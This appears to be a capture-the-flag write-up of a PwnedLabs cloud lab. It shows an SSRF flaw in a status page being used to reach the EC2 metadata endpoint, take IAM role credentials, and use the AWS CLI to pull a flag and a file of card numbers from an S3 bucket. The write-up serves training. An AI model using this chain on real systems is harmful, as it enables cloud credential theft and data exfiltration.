---
title: SSRF to Pwned
layout: post
date: 2025-07-15
categories: [Writeups, PwnedLabs]
tags: [Cloud, AWS, SSRF]
author: bailee
toc: true
description: Investigate links to a potentially compromised organization’s cloud infrastructure and map out any potential risk exposure, and how far it goes. 
---
Lab Platform: 
: [PwnedLabs](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/)

---

## Tools & Resources
### Tools Used

- AWS CLI


### References

- <https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/>

---

## Lab Walkthrough

### Enumeration

We know that the website belonging to Huge Logistics is [`http://app.huge-logistics.com/`](http://app.huge-logistics.com/). 

![image.png](/assets/img/ssrf2pwned/image.png)

I was looking around the HTML of the website, and found a pointer to an S3 bucket. 

![image.png](/assets/img/ssrf2pwned/image1.png)

I’m going to navigate to that. 

![image.png](/assets/img/ssrf2pwned/image2.png)

Oh, there’s a flag! But… I can’t navigate to it, or anything in the /backup/ directory 

I clicked around the website trying to find anything else, and came across the Status page. When I click ‘Check’, the URL (which was once `http://app.huge-logistics.com/status/status.php`) , adds a query to the end of URL. 

![image.png](/assets/img/ssrf2pwned/image3.png)

Wonder if I could add a different name to that query? Something like… the metadata service? 

![image.png](/assets/img/ssrf2pwned/image4.png)

Yep, that did it. Looks like it’s listing the directories (`dynamic`, `meta-data`, and `user-data`). I’m going to select meta-data and keep going from there until I find something interesting. 

![image.png](/assets/img/ssrf2pwned/image5.png)

Wow, so the path `169.254.169.254/latest/meta-data/iam/security-credentials/MetapwnedS3Access` gave me the CLI credentials for this role, `MetapwnedS3Access`. I’m just going to log in with those… 

### Data Exfiltration

> Note: I had to reload my VPN and everything, so those credentials are different now.
> 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws sts get-caller-identity
{
    "UserId": "AROARQVIRZ4UCHIUOGHDS:i-0199bf97fb9d996f1",
    "Account": "104506445608",
    "Arn": "arn:aws:sts::104506445608:assumed-role/MetapwnedS3Access/i-0199bf97fb9d996f1"
}
```

Cool, so we’re using a role for an EC2 instance, the one that’s running this web server. Can I get into that S3 bucket now? 

```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 ls huge-logistics-storage                             
                           PRE backup/
                           PRE web/

┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 ls huge-logistics-storage/backup/
2023-05-31 18:14:05          0 
2023-05-31 18:14:47       3717 cc-export2.txt
2023-06-01 10:38:27         32 flag.txt
                                                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 cp s3://huge-logistics-storage/backup/cc-export2.txt -
VISA, 4929854977595222, 5/2028, 733
VISA, 4532044427558124, 7/2024, 111
VISA, 4539773096403690, 12/2028, 429
...
                                                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 cp s3://huge-logistics-storage/backup/flag.txt -      
```

Yep, sure can! So now I have some credit card numbers, cool, and the flag!